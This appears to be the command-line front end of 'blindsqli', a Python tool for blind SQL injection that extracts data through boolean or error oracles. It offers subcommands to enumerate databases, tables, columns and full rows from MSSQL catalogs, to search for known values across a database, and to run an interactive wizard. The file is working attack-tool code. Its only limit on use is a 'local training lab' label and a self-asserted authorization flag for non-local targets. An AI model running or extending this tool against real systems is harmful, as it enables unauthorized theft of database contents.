"""Command-line interface.

Subcommands:
  extract    -- recover a target value via the boolean/error oracle
  calibrate  -- probe the target and print the observed true/false fingerprints
  version    -- print version

Configuration precedence: built-in defaults < --config file < explicit flags.
"""

from __future__ import annotations

import argparse
import json
import signal
import sys
from typing import Optional

from . import __version__
from .config import Config, DEFAULT_CHARSET, PRINTABLE_CHARSET
from .dialect import get_dialect
from .engine import ExfiltrationEngine
from .logging_util import Logger
from .oracle import BooleanOracle, CalibrationError
from .predictor import CharacterPredictor
from .sequence import SequencePredictor
from .knowledge import load_knowledge, save_knowledge, seed_predictors
from .reporting import NullReporter, TerminalReporter
from .scope import ScopeError
from . import targets as targets_mod
from .discovery import MetadataDiscoverer
from .keywords import load_keywords, parse_keyword_line
from .metadata import MetadataIndex
from .results import SearchResults
from .search import KeywordSearchEngine, estimate_scope
from .wizard import Wizard


# ----------------------------------------------------------------- arg parsing
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="blindsqli",
        description="Boolean/error-based blind SQL injection exfiltration "
                    "(local training lab only).",
    )
    p.add_argument("--config", help="YAML or JSON config file")
    sub = p.add_subparsers(dest="command", required=True)

    def add_common(sp: argparse.ArgumentParser) -> None:
        # Also accept --config after the subcommand (the natural position).
        # SUPPRESS default so it never overwrites a value given before it.
        sp.add_argument("--config", dest="config", default=argparse.SUPPRESS,
                        help="YAML or JSON config file (accepted here or before the subcommand)")
        sp.add_argument("--url", dest="target_url")
        sp.add_argument("--method", dest="http_method", choices=["GET", "POST", "get", "post"])
        sp.add_argument("--param", dest="injection_param")
        sp.add_argument("--base-payload", dest="base_payload")
        sp.add_argument("--timeout", dest="request_timeout", type=float)
        sp.add_argument("--retries", dest="max_retries", type=int)
        sp.add_argument("--workers", dest="workers", type=int)
        sp.add_argument("--dialect", dest="dialect")
        sp.add_argument("--collation", dest="collation",
                        help="override SQL comparison collation (MSSQL default: Latin1_General_BIN)")
        sp.add_argument("--no-collation", dest="collation", action="store_const", const="",
                        help="disable the COLLATE clause on comparisons (if the default is unsupported)")
        sp.add_argument("--proxy", dest="proxy",
                        help="route all requests through this proxy, e.g. http://127.0.0.1:8080")
        sp.add_argument("--proxy-insecure", dest="proxy_insecure",
                        action="store_true", default=None,
                        help="disable TLS verification (intercepting proxy with a self-signed CA)")
        sp.add_argument("--body-mode", dest="body_mode",
                        choices=["auto", "form", "json", "raw"],
                        help="how the injected value is carried (default auto)")
        sp.add_argument("--json-template", dest="json_template",
                        help="base JSON body (a JSON object string) for --body-mode json; "
                             "--param is the dotted key path to inject into")
        sp.add_argument("--body-template", dest="body_template",
                        help="raw body template for --body-mode raw; use {value} or {value_json}")
        sp.add_argument("--content-type", dest="content_type",
                        help="Content-Type override (mainly for --body-mode raw)")
        sp.add_argument("-v", "--verbose", action="count", default=0,
                        help="increase verbosity (repeatable)")
        sp.add_argument("-q", "--quiet", action="store_true")
        sp.add_argument("--i-have-authorization", dest="allow_nonlocal",
                        action="store_true", default=None,
                        help="permit a non-local target (you assert you are authorized)")
        sp.add_argument("--knowledge", dest="knowledge_file",
                        help="JSON file of previously-extracted values: seeds prediction "
                             "and is updated (deduplicated) after the run")

    ex = sub.add_parser("extract", help="extract a target value")
    add_common(ex)
    ex.add_argument("--charset", dest="charset")
    ex.add_argument("--max-length", dest="max_length", type=int)
    ex.add_argument("--strategy", dest="strategy", choices=["adaptive", "linear", "binary"])
    ex.add_argument("--no-length", dest="discover_length", action="store_false", default=None)
    ex.add_argument("--verify-exists", dest="verify_exists", action="store_true", default=None,
                    help="probe that the target value/row exists (non-NULL) before "
                         "extracting it, so a missing target costs one request "
                         "instead of a full failed character search")
    ex.add_argument("--target-name", dest="target_name")
    ex.add_argument("--expr", dest="target_expression",
                    help="scalar SQL subquery to exfiltrate")
    ex.add_argument("--preset", choices=["first-table", "db-name"],
                    help="use a built-in target instead of --expr")
    ex.add_argument("--database", dest="database",
                    help="for --preset first-table: read this database's catalog")
    ex.add_argument("--output", dest="output_file")

    en = sub.add_parser("enumerate", help="extract every value of a metadata set (e.g. all table names)")
    add_common(en)
    en.add_argument("--what", choices=["databases", "tables", "columns", "rows"], default="tables",
                    help="what to enumerate (default: tables)")
    en.add_argument("--table", dest="table", help="table name (required for --what columns/rows)")
    en.add_argument("--database", dest="database",
                    help="scope tables/columns/rows to this database (default: the current one)")
    en.add_argument("--columns", dest="columns",
                    help="comma-separated columns for --what rows (concatenated per row)")
    en.add_argument("--sep", dest="sep", default=":",
                    help="separator between concatenated columns (default ':')")
    en.add_argument("--schema", dest="schema", default="dbo",
                    help="table schema for --what rows (default: dbo)")
    en.add_argument("--where", dest="where",
                    help="optional SQL WHERE filter on the catalog/rows: for --what "
                         "tables it filters INFORMATION_SCHEMA.TABLES (e.g. "
                         "\"TABLE_NAME LIKE '%%user%%'\" or \"TABLE_SCHEMA='dbo'\"); for "
                         "--what columns it is ANDed with the TABLE_NAME predicate on "
                         "INFORMATION_SCHEMA.COLUMNS (e.g. \"TABLE_SCHEMA='dbo'\"); for "
                         "--what rows it filters the data rows")
    en.add_argument("--order-by", dest="order_by",
                    help="ORDER BY expression for --what rows (default: first column)")
    en.add_argument("--row-expr", dest="row_expr",
                    help="custom scalar row expression for --what rows (overrides --columns)")
    en.add_argument("--limit", dest="limit", type=int, default=0, help="max rows (0 = all)")
    en.add_argument("--max-count", dest="max_count", type=int, default=4096)
    en.add_argument("--charset", dest="charset")
    en.add_argument("--max-length", dest="max_length", type=int)
    en.add_argument("--strategy", dest="strategy", choices=["adaptive", "linear", "binary"])
    en.add_argument("--verify-exists", dest="verify_exists", action="store_true", default=None,
                    help="skip rows whose value is NULL cheaply (one request) instead "
                         "of a full failed extraction")
    en.add_argument("--output", dest="output_file")

    se = sub.add_parser("search", help="find where known values live across the "
                                       "authorized scope (cross-scope keyword search)")
    add_common(se)
    se.add_argument("--keyword", dest="keywords", action="append", default=[],
                    help="a value to locate (repeatable)")
    se.add_argument("--keywords-file", dest="keywords_file",
                    help="plain-text keyword file (one per line; # comments, "
                         "#! directives and ' ;; opts' supported)")
    se.add_argument("--databases", dest="databases",
                    help="comma-separated databases to restrict the search to")
    se.add_argument("--max-candidates", dest="max_candidates", type=int, default=50,
                    help="heuristic cap: most-likely columns tested per keyword (default 50)")
    se.add_argument("--exhaustive", dest="exhaustive", action="store_true",
                    help="test every discovered column (ignores --max-candidates; can be very slow)")
    se.add_argument("--stop-after", dest="stop_after", type=int, default=None,
                    help="stop a keyword after this many confirmed locations")
    se.add_argument("--count-rows", dest="count_rows", action="store_true",
                    help="also count matching rows per confirmed location (extra requests)")
    se.add_argument("--search-workers", dest="search_workers", type=int, default=1,
                    help="independent keywords searched concurrently (default 1)")
    se.add_argument("--meta-file", dest="meta_file",
                    help="JSON metadata index: reused if present, updated after discovery")
    se.add_argument("--results-file", dest="results_file", default="search_results.json",
                    help="where confirmed/probable matches are written")
    se.add_argument("--estimate-only", dest="estimate_only", action="store_true",
                    help="discover/estimate scope and print the cost, without searching")
    se.add_argument("--charset", dest="charset")
    se.add_argument("--max-length", dest="max_length", type=int)
    se.add_argument("--strategy", dest="strategy", choices=["adaptive", "linear", "binary"])
    se.add_argument("--max-count", dest="max_count", type=int, default=4096)

    wz = sub.add_parser("wizard", help="interactive setup and exploration wizard")
    add_common(wz)
    wz.add_argument("--keywords-file", dest="keywords_file",
                    help="preload keywords from this file")
    wz.add_argument("--meta-file", dest="meta_file",
                    help="metadata index to load at start and save on demand")
    wz.add_argument("--results-file", dest="results_file", default="search_results.json",
                    help="search results to load at start and save on demand")
    wz.add_argument("--charset", dest="charset")
    wz.add_argument("--max-length", dest="max_length", type=int)
    wz.add_argument("--strategy", dest="strategy", choices=["adaptive", "linear", "binary"])

    cal = sub.add_parser("calibrate", help="probe target and show true/false fingerprints")
    add_common(cal)

    sub.add_parser("version", help="print version")
    return p


def _apply_overrides(cfg: Config, args: argparse.Namespace) -> Config:
    fields = [
        "target_url", "http_method", "injection_param", "base_payload",
        "request_timeout", "max_retries", "workers", "dialect", "charset",
        "max_length", "strategy", "discover_length", "target_name",
        "target_expression", "output_file", "allow_nonlocal", "collation",
        "proxy", "proxy_insecure", "body_mode", "body_template", "content_type",
        "knowledge_file", "database", "verify_exists",
    ]
    for f in fields:
        val = getattr(args, f, None)
        if val is not None:
            setattr(cfg, f, val)
    # json_template arrives as a JSON string on the CLI
    jt = getattr(args, "json_template", None)
    if jt is not None:
        try:
            cfg.json_template = json.loads(jt)
        except ValueError as exc:
            raise SystemExit(f"--json-template is not valid JSON: {exc}")
    if getattr(args, "http_method", None):
        cfg.http_method = args.http_method.upper()
    # verbosity
    if getattr(args, "quiet", False):
        cfg.verbosity = 0
    elif getattr(args, "verbose", 0):
        cfg.verbosity = 1 + args.verbose
    return cfg


def _build_dialect(cfg: Config):
    dialect = get_dialect(cfg.dialect)
    if cfg.collation is not None:
        # "" -> disable COLLATE; a name -> use it; None -> keep dialect default
        dialect.collation = cfg.collation or None
    return dialect


def _build_engine(cfg: Config, logger: Logger) -> ExfiltrationEngine:
    """Assemble an engine (oracle + predictors + knowledge seeding), the shared
    core used by extract/enumerate/search/wizard."""
    reporter = NullReporter() if cfg.verbosity == 0 else TerminalReporter(verbosity=cfg.verbosity)
    oracle = BooleanOracle(cfg, logger=logger)
    predictor = CharacterPredictor(cfg.charset, order=cfg.predictor_order)
    seqp = SequencePredictor(min_prefix=cfg.min_seq_prefix)
    known = load_knowledge(cfg.knowledge_file)
    if known:
        seed_predictors(predictor, seqp, known)
        logger.info(f"loaded {len(known)} known values from {cfg.knowledge_file}")
    return ExfiltrationEngine(cfg, oracle, char_predictor=predictor,
                              seq_predictor=seqp, logger=logger, reporter=reporter)


def _build_target(cfg: Config, args: argparse.Namespace):
    dialect = _build_dialect(cfg)
    preset = getattr(args, "preset", None)
    if preset == "first-table":
        return targets_mod.first_table_name(dialect, database=cfg.database)
    if preset == "db-name":
        return targets_mod.database_name(dialect)
    return targets_mod.custom(dialect, cfg.target_name, cfg.target_expression)


# ----------------------------------------------------------------- commands
def cmd_calibrate(cfg: Config, logger: Logger) -> int:
    oracle = BooleanOracle(cfg, logger=logger)
    try:
        oracle.calibrate()
    except CalibrationError as exc:
        logger.error(f"calibration failed: {exc}")
        return 2
    clf = oracle.classifier
    ok, err = clf.ok, clf.error  # type: ignore[attr-defined]
    print(json.dumps({
        "ok": {"status": ok.status, "length": ok.length, "elapsed": round(ok.elapsed, 4)},
        "error": {"status": err.status, "length": err.length, "elapsed": round(err.elapsed, 4)},
        "distinguishable_by": _distinguishers(ok, err),
    }, indent=2))
    return 0


def _distinguishers(ok, err) -> list:
    d = []
    if ok.status != err.status:
        d.append("status")
    if ok.length != err.length:
        d.append("length")
    if ok.body != err.body:
        d.append("body")
    return d


class _GracefulStop:
    """Ctrl+C once -> ask the engine to stop cleanly after the current step
    (partial result is kept and saved). Ctrl+C twice -> force quit."""

    def __init__(self, engine, logger: Logger) -> None:
        self.engine = engine
        self.logger = logger
        self._old = None

    def __enter__(self) -> "_GracefulStop":
        try:
            self._old = signal.signal(signal.SIGINT, self._handle)
        except ValueError:  # not the main thread (e.g. under tests)
            self._old = None
        return self

    def _handle(self, signum, frame) -> None:
        if self.engine.cancelled():
            raise KeyboardInterrupt  # second Ctrl+C -> force
        self.logger.error("stopping after the current step... (Ctrl+C again to force quit)")
        self.engine.request_cancel()

    def __exit__(self, *exc) -> None:
        if self._old is not None:
            try:
                signal.signal(signal.SIGINT, self._old)
            except ValueError:
                pass


def cmd_extract(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
    reporter = NullReporter() if cfg.verbosity == 0 else TerminalReporter(verbosity=cfg.verbosity)
    oracle = BooleanOracle(cfg, logger=logger)
    predictor = CharacterPredictor(cfg.charset, order=cfg.predictor_order)
    seqp = SequencePredictor(min_prefix=cfg.min_seq_prefix)
    known = load_knowledge(cfg.knowledge_file)
    if known:
        seed_predictors(predictor, seqp, known)
        logger.info(f"loaded {len(known)} known values from {cfg.knowledge_file}")
    engine = ExfiltrationEngine(cfg, oracle, char_predictor=predictor,
                                seq_predictor=seqp, logger=logger, reporter=reporter)
    target = _build_target(cfg, args)
    logger.info(f"Extracting {target.name} from {cfg.target_url}")
    logger.verbose(f"target expression: {target.expression}")
    try:
        with _GracefulStop(engine, logger):
            result = engine.extract(target)
    except CalibrationError as exc:
        logger.error(f"calibration failed: {exc}")
        return 2

    # only persist a fully-recovered value to the knowledge base
    if cfg.knowledge_file and result.value and result.complete:
        merged = save_knowledge(cfg.knowledge_file, known + [result.value])
        logger.info(f"knowledge file now holds {len(merged)} unique values")

    out = result.to_dict()
    out["already_known"] = result.value in known
    with open(cfg.output_file, "w", encoding="utf-8") as fh:
        json.dump(out, fh, indent=2)
    logger.info(f"wrote {cfg.output_file}")
    print(json.dumps(out, indent=2))
    return 0 if result.complete else 1


def cmd_enumerate(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
    what = getattr(args, "what", "tables")
    # Real data values contain punctuation the identifier charset omits; widen it
    # for --what rows unless the caller set an explicit charset.
    if what == "rows" and getattr(args, "charset", None) is None and cfg.charset == DEFAULT_CHARSET:
        cfg.charset = PRINTABLE_CHARSET

    reporter = NullReporter() if cfg.verbosity == 0 else TerminalReporter(verbosity=cfg.verbosity)
    oracle = BooleanOracle(cfg, logger=logger)
    predictor = CharacterPredictor(cfg.charset, order=cfg.predictor_order)
    seqp = SequencePredictor(min_prefix=cfg.min_seq_prefix)
    known = load_knowledge(cfg.knowledge_file)
    if known:
        seed_predictors(predictor, seqp, known)
        logger.info(f"loaded {len(known)} known values from {cfg.knowledge_file}")
    known_set = set(known)
    engine = ExfiltrationEngine(
        cfg, oracle, char_predictor=predictor, seq_predictor=seqp,
        logger=logger, reporter=reporter,
    )
    dialect = get_dialect(cfg.dialect)
    if cfg.collation is not None:
        dialect.collation = cfg.collation or None

    database = cfg.database
    if what == "databases":
        count_expr = "(SELECT COUNT(*) FROM sys.databases)"
        row = lambda i: targets_mod.nth_database_name(dialect, offset=i)
    elif what == "columns":
        if not getattr(args, "table", None):
            logger.error("--what columns requires --table")
            return 2
        where = getattr(args, "where", None)
        count_expr = targets_mod.columns_count_expr(args.table, database=database, where=where)
        row = lambda i: targets_mod.first_column_name(
            dialect, args.table, offset=i, database=database, where=where)
    elif what == "rows":
        table = getattr(args, "table", None)
        if not table:
            logger.error("--what rows requires --table")
            return 2
        cols = [c.strip() for c in (getattr(args, "columns", None) or "").split(",") if c.strip()]
        row_expr = getattr(args, "row_expr", None)
        if not cols and not row_expr:
            logger.error("--what rows requires --columns or --row-expr")
            return 2
        schema = getattr(args, "schema", None) or "dbo"
        sep = getattr(args, "sep", ":")
        where = getattr(args, "where", None)
        order_by = getattr(args, "order_by", None)
        count_expr = targets_mod.row_count_expr(database, schema, table, where=where)
        row = lambda i: targets_mod.row_value(
            dialect, table, cols, offset=i, database=database, schema=schema,
            sep=sep, where=where, order_by=order_by, row_expr=row_expr,
        )
    else:
        where = getattr(args, "where", None)
        count_expr = targets_mod.tables_count_expr(database, where=where)
        row = lambda i: targets_mod.first_table_name(
            dialect, offset=i, database=database, where=where)

    logger.info(f"Enumerating {what} from {cfg.target_url}")
    rows = []
    all_complete = True
    stopped = False
    with _GracefulStop(engine, logger):
        try:
            total = engine.discover_count(count_expr, max_count=getattr(args, "max_count", 4096))
        except CalibrationError as exc:
            logger.error(f"calibration failed: {exc}")
            return 2
        if total is None:
            if engine.cancelled():
                logger.error("stopped by user during count discovery")
                return 130
            logger.error("could not determine the row count")
            return 2
        if getattr(args, "limit", 0):
            total = min(total, args.limit)
        logger.info(f"{total} {what} to extract")

        for i in range(total):
            if engine.cancelled():
                stopped = True
                logger.error(f"stopped by user after {len(rows)} of {total} {what}")
                break
            result = engine.extract(row(i))
            rows.append({
                "offset": i, "value": result.value, "complete": result.complete,
                "exists": result.exists,
                "already_known": result.value in known_set,
            })
            # a NULL-valued row is not an incomplete extraction, just empty
            all_complete = all_complete and (result.complete or result.missing)
            if result.cancelled:
                stopped = True
            if result.missing:
                logger.info(f"[{i}] <NULL> (skipped; no value)")
            else:
                tag = " (already known)" if result.value in known_set else ""
                logger.info(f"[{i}] {result.value!r}{'' if result.complete else ' (partial)'}{tag}")

    # only persist fully-recovered values to the knowledge base
    values = [r["value"] for r in rows]
    complete_values = [r["value"] for r in rows if r["complete"]]
    if cfg.knowledge_file and complete_values:
        merged = save_knowledge(cfg.knowledge_file, list(known) + complete_values)
        logger.info(f"knowledge file now holds {len(merged)} unique values")

    out = {
        "what": what,
        "table": getattr(args, "table", None),
        "count": total,
        "extracted": len(rows),
        "stopped": stopped,
        "values": values,
        "unique_values": sorted(set(values)),
        "new_values": sorted(set(values) - known_set),
        "rows": rows,
        "requests_completed": oracle.requests_completed,
        "requests_failed": oracle.requests_failed,
    }
    with open(cfg.output_file, "w", encoding="utf-8") as fh:
        json.dump(out, fh, indent=2)
    logger.info(f"wrote {cfg.output_file} ({len(rows)} of {total} {what})")
    print(json.dumps(out, indent=2))
    return 0 if (all_complete and not stopped) else 1


def _collect_keywords(args: argparse.Namespace, logger: Logger):
    keywords = []
    if getattr(args, "keywords_file", None):
        try:
            keywords.extend(load_keywords(args.keywords_file))
        except OSError as exc:
            logger.error(f"could not read {args.keywords_file}: {exc}")
    for raw in getattr(args, "keywords", None) or []:
        kw = parse_keyword_line(raw)
        if kw is not None:
            keywords.append(kw)
    return keywords


def cmd_search(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
    # Real values carry punctuation the identifier charset omits; widen it
    # for the name enumeration done during discovery unless overridden.
    if getattr(args, "charset", None) is None and cfg.charset == DEFAULT_CHARSET:
        cfg.charset = PRINTABLE_CHARSET

    engine = _build_engine(cfg, logger)
    dialect = _build_dialect(cfg)
    keywords = _collect_keywords(args, logger)
    if not keywords and not args.estimate_only:
        logger.error("no keywords: use --keyword and/or --keywords-file")
        return 2

    databases = ([d.strip() for d in args.databases.split(",") if d.strip()]
                 if args.databases else None)
    index = MetadataIndex.load(args.meta_file) if args.meta_file else MetadataIndex()
    results = SearchResults.load(args.results_file) if args.results_file else SearchResults()
    disc = MetadataDiscoverer(engine, dialect, index, logger=logger,
                              max_count=getattr(args, "max_count", 4096))

    with _GracefulStop(engine, logger):
        try:
            if index.counts(databases)["columns"] == 0:
                logger.info("no cached metadata; discovering scope (read-only)")
                disc.discover_all_columns(databases=databases)
        except CalibrationError as exc:
            logger.error(f"calibration failed: {exc}")
            return 2
        known_cols = index.counts(databases)["columns"]
        max_candidates = known_cols if args.exhaustive else args.max_candidates
        est = estimate_scope(index, max(1, len(keywords)), max_candidates, databases)
        logger.info("\n" + est.render())
        if args.estimate_only:
            if args.meta_file:
                index.save(args.meta_file)
            print(json.dumps(est.__dict__, indent=2))
            return 0
        se = KeywordSearchEngine(engine, dialect, index, results=results,
                                 logger=logger, workers=args.search_workers)
        se.search(keywords, databases=databases, max_candidates=max_candidates,
                  stop_after=args.stop_after, count_rows=args.count_rows)

    if args.meta_file:
        index.save(args.meta_file)
        logger.info(f"metadata index saved to {args.meta_file}")
    if args.results_file:
        results.save(args.results_file)
        logger.info(f"wrote {args.results_file}")

    out = {
        "keywords": [k.value for k in keywords],
        "scope": index.counts(databases),
        "summary": results.summary(),
        "confirmed": [m.to_dict() for m in results.confirmed()],
        "matches": [m.to_dict() for m in results.all()],
        "requests_completed": engine.oracle.requests_completed,
    }
    print(json.dumps(out, indent=2, default=str))
    return 0


def cmd_wizard(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
    if getattr(args, "charset", None) is None and cfg.charset == DEFAULT_CHARSET:
        cfg.charset = PRINTABLE_CHARSET
    engine = _build_engine(cfg, logger)
    dialect = _build_dialect(cfg)
    index = MetadataIndex.load(args.meta_file) if args.meta_file else MetadataIndex()
    results = SearchResults.load(args.results_file) if args.results_file else SearchResults()
    wiz = Wizard(cfg, engine, dialect, index=index, results=results,
                 meta_file=args.meta_file, results_file=args.results_file)
    if getattr(args, "keywords_file", None):
        try:
            wiz.state.keywords = load_keywords(args.keywords_file)
            logger.info(f"preloaded {len(wiz.state.keywords)} keywords")
        except OSError as exc:
            logger.error(f"could not read {args.keywords_file}: {exc}")
    with _GracefulStop(engine, logger):
        return wiz.run()


# ----------------------------------------------------------------- entry
def main(argv: Optional[list] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.command == "version":
        print(__version__)
        return 0

    cfg = Config.load(args.config) if args.config else Config()
    cfg = _apply_overrides(cfg, args)
    try:
        cfg.validate()
    except ValueError as exc:
        print(f"config error: {exc}", file=sys.stderr)
        return 2

    logger = Logger(cfg.verbosity)
    try:
        if args.command == "calibrate":
            return cmd_calibrate(cfg, logger)
        if args.command == "extract":
            return cmd_extract(cfg, args, logger)
        if args.command == "enumerate":
            return cmd_enumerate(cfg, args, logger)
        if args.command == "search":
            return cmd_search(cfg, args, logger)
        if args.command == "wizard":
            return cmd_wizard(cfg, args, logger)
    except ScopeError as exc:
        print(f"scope error: {exc}", file=sys.stderr)
        return 3
    except KeyboardInterrupt:
        print("aborted (force quit); partial progress was not saved", file=sys.stderr)
        return 130
    parser.error(f"unknown command {args.command}")
    return 2


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
